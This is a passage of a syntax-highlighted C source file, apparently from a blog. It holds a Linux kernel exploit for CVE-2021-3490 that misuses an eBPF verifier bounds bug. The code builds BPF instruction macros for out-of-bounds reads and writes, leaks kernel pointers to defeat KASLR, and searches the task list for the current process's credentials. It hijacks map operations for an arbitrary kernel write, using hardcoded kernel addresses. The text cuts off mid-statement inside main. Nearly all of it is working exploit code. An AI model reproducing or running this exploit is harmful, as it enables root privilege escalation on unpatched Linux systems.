class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernelpwn.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;bpf_tools.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ARRAY_MAP_OPS   0xffffffff822363e0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ARRAY_MAP_GET_NEXT_KEY 0xffffffff81239c80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_TASK       0xffffffff82e1b400</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED       0xffffffff82e88f20</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAP_SIZE 0x2000</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VULN_REG    BPF_REG_6</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRIGGER_VULN(__map_fd)                          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* load value into r2, make it part-unknown */</span>  \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, VULN_REG, BPF_REG_8, 0),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_4, 0xffffffff),           \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_4),    \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* r3 = 0x100000002 */</span>                          \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_3, 0x1),                  \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, 0x2),         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* triger the vulnerability */</span>                  \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_3)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAKE_VULN_REG(__map_fd)                         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* load value into r3, make it [0, 1] under 32 bit */</span>                \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),   \</span><br><span class="hljs-meta">        BPF_JMP32_IMM(BPF_JLE, BPF_REG_7, 1, 2),        \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                    \</span><br><span class="hljs-meta">        BPF_EXIT_INSN(),                                \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_ADD, VULN_REG, BPF_REG_7),    \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_AND, VULN_REG, 0x1),          \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_0, 0)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> READ_ARBITRARY_ADDR(__map_fd, __idx)            \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu-&gt;limit and do the oob read */</span> \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xd0),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* write the value into bpf_map-&gt;btf */</span>         \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(__idx, __map_fd, BPF_REG_8),     \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_8, 0),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 0x58),        \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_1, 0)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">read_arbitrary_addr_4_bytes</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">int</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        MAKE_VULN_REG(map_fd),<br>        READ_ARBITRARY_ADDR(map_fd, idx), <br>        BPF_EXIT_INSN()<br>    &#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_info</span> <span class="hljs-title">info</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .info.bpf_fd = map_fd,<br>        .info.info_len = <span class="hljs-keyword">sizeof</span>(info),<br>        .info.info = (<span class="hljs-type">uint64_t</span>) &amp;info,<br>    &#125;;<br>    <span class="hljs-type">size_t</span> data;<br>    <span class="hljs-type">int</span> ret;<br><br>    ret = run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(&amp;info, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(info));<br>    ret = bpf(BPF_OBJ_GET_INFO_BY_FD, &amp;attr);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    data = info.btf_id;<br><br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">read_arbitrary_addr</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">size_t</span> addr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> data;<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br><br>    key = <span class="hljs-number">1</span>;<br>    value[<span class="hljs-number">0</span>] = addr;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br>    key = <span class="hljs-number">2</span>;<br>    value[<span class="hljs-number">0</span>] = addr + <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br><br>    data = read_arbitrary_addr_4_bytes(map_fd, <span class="hljs-number">2</span>);<br>    data &lt;&lt;= <span class="hljs-number">32</span>;<br>    data += read_arbitrary_addr_4_bytes(map_fd, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><br><span class="hljs-type">size_t</span> current_task, current_cred;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">search_for_current_task</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> next_task = INIT_TASK + kernel_offset + <span class="hljs-number">0x818</span>;<br>    <span class="hljs-type">size_t</span> data;<br><br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    <span class="hljs-keyword">do</span> &#123;<br>        next_task = read_arbitrary_addr(map_fd, next_task);<br>        data = read_arbitrary_addr(map_fd, next_task + <span class="hljs-number">0x2d0</span>);<br>    &#125; <span class="hljs-keyword">while</span> (data != *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> next_task - <span class="hljs-number">0x818</span>;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LEAK_MAP_ADDR(__map_fd)                         \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV32_REG(VULN_REG, VULN_REG),              \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0)</span><br><br><span class="hljs-type">size_t</span> map_addr;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">leak_map_addr</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        LEAK_MAP_ADDR(map_fd), <br>        BPF_EXIT_INSN()<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LEAK_MAP_OPS(__map_fd)                      \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu-&gt;limit and do the oob read */</span> \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x110),        \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),   \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* save the value into map */</span>                   \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0)</span><br><br><span class="hljs-type">size_t</span> map_ops_addr;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">leak_map_ops_addr</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        MAKE_VULN_REG(map_fd),<br>        LEAK_MAP_OPS(map_fd), <br>        BPF_EXIT_INSN()<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAKE_ARBITRARY_WRITE_OPS(__map_fd)          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu_limit */</span>                      \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite spin_lock_off */</span>                   \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xE4),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 0x2000),               \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite max_entries */</span>                     \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x8),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 0xffffffff),           \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite map type */</span>                        \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xC),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 23),                   \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite the map-&gt;ops */</span>                    \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x18),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(2, __map_fd, BPF_REG_4), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_4, 0),   \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_5, 0)</span><br><br><span class="hljs-type">size_t</span> fake_ops_addr;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">make_arbitrary_write_ops</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        MAKE_VULN_REG(map_fd),<br>        MAKE_ARBITRARY_WRITE_OPS(map_fd),<br>        BPF_EXIT_INSN()<br>    &#125;;<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> per_ops_ptr, value[<span class="hljs-number">0x1000</span>], value_idx;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_ops</span> *<span class="hljs-title">ops_data</span>;</span><br><br>    <span class="hljs-comment">/* save fake ops addr into map */</span><br>    fake_ops_addr = map_addr + <span class="hljs-number">0x110</span> + MAP_SIZE;<br><br>    <span class="hljs-comment">/* read ops */</span><br>    value_idx = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> bpf_map_ops); i += <span class="hljs-number">8</span>) &#123;<br>        per_ops_ptr = read_arbitrary_addr(map_fd, map_ops_addr + i);<br>        value[value_idx++] = per_ops_ptr;<br>    &#125;<br><br>    <span class="hljs-comment">/* load ops */</span><br>    ops_data = (<span class="hljs-keyword">struct</span> bpf_map_ops *) value;<br>    ops_data-&gt;map_push_elem = (<span class="hljs-type">void</span>*) (ARRAY_MAP_GET_NEXT_KEY + kernel_offset);<br>    key = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* we&#x27;ll take fake ops&#x27;s addr from map */</span><br>    key = <span class="hljs-number">2</span>;<br>    value[<span class="hljs-number">0</span>] = fake_ops_addr;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* hijack the map */</span><br>    run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">arbitrary_write_4_bytes_by_map</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">size_t</span> addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> val)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">int</span> key;<br><br>    key = <span class="hljs-number">0</span>;<br>    value[<span class="hljs-number">0</span>] = val - <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">return</span> bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], addr);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> READ_MAP_DATA(__map_fd, __off)                      \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu-&gt;limit and do the oob read */</span> \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, __off),        \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),   \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* save the value into map */</span>                   \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0)</span><br><br><span class="hljs-comment">/* for debug only */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">read_map_data</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> map_data[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Loading value into map...&quot;</span>);<br>    key = <span class="hljs-number">0</span>;<br>    value[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">0x110</span> / <span class="hljs-number">8</span>); i++) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>            TRIGGER_VULN(map_fd),<br>            MAKE_VULN_REG(map_fd),<br>            READ_MAP_DATA(map_fd, (<span class="hljs-number">0x110</span> - <span class="hljs-number">0x8</span> * i)), <br>            BPF_EXIT_INSN()<br>        &#125;;<br><br>        <span class="hljs-keyword">if</span> (run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;FAILED to run bpf prog!&quot;</span>);<br>        &#125;<br><br>        key = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (bpf_map_lookup_elem(map_fd, &amp;key, &amp;value) &lt; <span class="hljs-number">0</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;FAILED to look up the map!&quot;</span>);<br>        &#125;<br>        map_data[i] = value[<span class="hljs-number">0</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">0x200</span> / <span class="hljs-number">8</span>); i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[----data dump----][%d] %lx\n&quot;</span>, i, map_data[i]);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> map_fd;<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">int</span> log_fd;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[=] CVE-2021-3490 explotation by arttnba3\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Creating new eBPF map...&quot;</span>);<br>    map_fd = bpf_map_create(BPF_MAP_TYPE_ARRAY, <span class="hljs-number">4</span>, MAP_SIZE, <span class="hljs-number">0x100</span>);<br>    <span class="hljs-keyword">if</span> (map_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to create eBPF map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Loading value into map...&quot;</span>);<br>    key = <span class="hljs-number">0</span>;<br>    value[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Leaking addr of bpf_map.ops ...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (leak_map_ops_addr(map_fd) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to run the eBPF prog!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Checking for leek...&quot;</span>);<br>    key = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_lookup_elem(map_fd, &amp;key, &amp;value) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (value[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">0xffffffff81000000</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Got bad value: %lx\n&quot;</span>, value[<span class="hljs-number">0</span>]);<br>        err_exit(<span class="hljs-string">&quot;FAILED to leak kernel info!&quot;</span>);<br>    &#125;<br><br>    map_ops_addr = value[<span class="hljs-number">0</span>];<br>    kernel_offset = map_ops_addr - 